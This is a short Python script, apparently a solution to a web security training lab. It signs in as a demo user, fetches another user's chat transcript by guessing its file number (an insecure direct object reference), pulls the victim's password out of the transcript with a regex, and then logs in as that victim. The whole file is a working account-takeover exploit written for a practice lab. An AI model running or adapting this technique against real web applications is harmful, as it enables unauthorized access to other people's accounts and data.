import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.carlos_password = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    def get_carlos_password(self):
        response = self.session.get(self.lab_url + 'download-transcript/1.txt')
        self.carlos_password = re.search(r'my password is (.*?)\.', response.text).group(1)

    def sign_in_as_carlos(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'carlos',
            'password': self.carlos_password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.get_carlos_password()
        self.sign_in_as_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
